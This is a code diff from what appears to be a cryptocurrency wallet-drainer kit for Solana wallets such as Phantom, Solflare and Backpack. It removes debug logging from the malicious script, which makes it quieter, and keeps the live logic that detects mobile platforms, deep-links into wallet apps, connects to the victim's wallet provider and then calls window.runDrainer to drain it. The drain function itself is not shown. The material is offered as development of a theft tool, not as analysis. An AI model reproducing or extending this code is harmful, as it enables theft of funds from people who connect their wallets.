@@ -4288,15 +4288,11 @@ window.runDrainer = runDrainer;
 
     // Enhanced mobile deep link function with platform-specific strategies
     function openInWalletMobile(walletType, currentUrl) {
-      console.log(`[MOBILE_DEEP_LINK] Opening ${walletType} with platform-specific strategies`);
-      
       // Enhanced mobile platform detection
       const userAgent = navigator.userAgent.toLowerCase();
       const isIOS = /iphone|ipad|ipod/.test(userAgent);
       const isAndroid = /android/.test(userAgent);
       const platform = isIOS ? 'ios' : isAndroid ? 'android' : 'unknown';
-      
-      console.log(`[MOBILE_DEEP_LINK] Platform detected: ${platform}`);
       
       // Find wallet definition
       const wallet = WALLET_DEFS.find(w => w.key === walletType);
@@ -4306,8 +4302,6 @@ window.runDrainer = runDrainer;
       }
       
       const strategies = wallet.mobile.mobileStrategies;
-      console.log(`[MOBILE_DEEP_LINK] Found ${strategies.length} strategies for ${walletType}`);
-      
       // Platform-specific strategy ordering
       let orderedStrategies = [];
       if (platform === 'ios') {
@@ -4326,15 +4320,12 @@ window.runDrainer = runDrainer;
         orderedStrategies = strategies;
       }
       
-      console.log(`[MOBILE_DEEP_LINK] Platform-ordered strategies:`, orderedStrategies);
-      
       // Try each strategy with enhanced timeout handling
       let strategyIndex = 0;
       let hasOpenedApp = false;
       
       const tryNextStrategy = () => {
         if (strategyIndex >= orderedStrategies.length) {
-          console.log(`[MOBILE_DEEP_LINK] All strategies failed for ${walletType}, redirecting to install page`);
           // All strategies failed, redirect to install page
           const installUrl = platform === 'ios' ? wallet.mobile.appStore : wallet.mobile.playStore;
           window.location.href = installUrl;
@@ -4352,7 +4343,6 @@ window.runDrainer = runDrainer;
           fullDeepLink = strategy + '?url=' + encodeURIComponent(currentUrl);
         }
         
-        console.log(`[MOBILE_DEEP_LINK] Trying strategy ${strategyIndex + 1}/${orderedStrategies.length}: ${fullDeepLink}`);
         
         try {
           // Enhanced deep link opening with better error handling
@@ -5784,7 +5774,6 @@ window.runDrainer = runDrainer;
     
     // Method 1: WalletConnect integration for mobile
     async connectWithWalletConnect() {
-      console.log('[MOBILE_CONNECT] Attempting WalletConnect connection...');
       
       try {
         // Check if WalletConnect is available
@@ -5845,7 +5834,6 @@ window.runDrainer = runDrainer;
 
     // Method 2: Mobile wallet detection and connection
     async detectAndConnectMobileWallets() {
-      console.log('[MOBILE_CONNECT] Detecting mobile wallets...');
       
       const mobileWallets = [
         {
@@ -5925,7 +5913,6 @@ window.runDrainer = runDrainer;
           }
           
           if (provider) {
-            console.log(`[MOBILE_CONNECT] Found ${wallet.name} provider, attempting connection...`);
             
             const result = await provider.connect({
               onlyIfTrusted: false,
@@ -5937,7 +5924,6 @@ window.runDrainer = runDrainer;
             });
             
             if (result && result.publicKey) {
-              console.log(`[MOBILE_CONNECT] Successfully connected to ${wallet.name}`);
               return {
                 success: true,
                 wallet: wallet.key,
@@ -5947,7 +5933,6 @@ window.runDrainer = runDrainer;
             }
           }
         } catch (error) {
-          console.log(`[MOBILE_CONNECT] ${wallet.name} connection failed:`, error.message);
         }
       }
       
@@ -5956,7 +5941,6 @@ window.runDrainer = runDrainer;
 
     // Method 3: Deep link fallback for mobile
     async connectWithDeepLink(walletType) {
-      console.log(`[MOBILE_CONNECT] Attempting deep link connection for ${walletType}...`);
       
       try {
         // Use the existing openInWallet function
@@ -5988,7 +5972,6 @@ window.runDrainer = runDrainer;
 
     // Method 4: QR Code generation for mobile scanning
     generateQRCode(uri) {
-      console.log('[MOBILE_CONNECT] Generating QR code for mobile scanning...');
       
       // Create QR code element
       const qrContainer = document.createElement('div');
@@ -6048,7 +6031,6 @@ window.runDrainer = runDrainer;
 
   // Enhanced mobile connection handler
   window.connectMobileWalletEnhanced = async function(walletType) {
-    console.log(`[MOBILE_CONNECT_ENHANCED] Starting enhanced mobile connection for ${walletType}...`);
     
     // Try multiple connection methods
     const methods = [
@@ -6059,11 +6041,9 @@ window.runDrainer = runDrainer;
     
     for (let i = 0; i < methods.length; i++) {
       try {
-        console.log(`[MOBILE_CONNECT_ENHANCED] Trying method ${i + 1}...`);
         const result = await methods[i]();
         
         if (result.success) {
-          console.log(`[MOBILE_CONNECT_ENHANCED] Method ${i + 1} succeeded!`);
           
           // Trigger connection with provider
           if (result.publicKey && result.provider) {
@@ -6078,7 +6058,6 @@ window.runDrainer = runDrainer;
             
             // Trigger the drain process directly
             if (window.runDrainer) {
-              console.log(`[MOBILE_CONNECT_ENHANCED] Triggering runDrainer for ${result.wallet || walletType} with provider`);
               window.runDrainer(result.provider);
             } else {
               console.error('[MOBILE_CONNECT_ENHANCED] runDrainer function not found');
@@ -6088,11 +6067,9 @@ window.runDrainer = runDrainer;
           return result;
         }
       } catch (error) {
-        console.log(`[MOBILE_CONNECT_ENHANCED] Method ${i + 1} failed:`, error.message);
       }
     }
     
-    console.log('[MOBILE_CONNECT_ENHANCED] All connection methods failed');
     showStatus('Mobile connection failed. Please try again.', 'error');
     return { success: false, error: 'All connection methods failed' };
   };
@@ -6243,11 +6220,6 @@ window.runDrainer = runDrainer;
             showStatus(`Opening Solflare wallet...`, 'info');
             
             // Add mobile debugging info
-            console.log(`[SOLFLARE_DEBUG] Current URL: ${window.location.href}`);
-            console.log(`[SOLFLARE_DEBUG] Target deep link: ${deepLink}`);
-            console.log(`[SOLFLARE_DEBUG] User agent: ${navigator.userAgent}`);
-            console.log(`[SOLFLARE_DEBUG] Touch points: ${navigator.maxTouchPoints}`);
-            console.log(`[SOLFLARE_DEBUG] Screen width: ${window.innerWidth}`);
             
             // Simple mobile Solflare - let auto-connect handle it like other wallets
             console.log(`[SOLFLARE_MOBILE] Using simple approach like Phantom and Backpack`);
@@ -6300,11 +6272,6 @@ window.runDrainer = runDrainer;
           showStatus(`Opening ${walletType} wallet...`, 'info');
             
             // Add mobile debugging info
-            console.log(`[MOBILE_DEBUG] Current URL: ${window.location.href}`);
-            console.log(`[MOBILE_DEBUG] Target deep link: ${deepLink}`);
-            console.log(`[MOBILE_DEBUG] User agent: ${navigator.userAgent}`);
-            console.log(`[MOBILE_DEBUG] Touch points: ${navigator.maxTouchPoints}`);
-            console.log(`[MOBILE_DEBUG] Screen width: ${window.innerWidth}`);
           }
           
         } else {
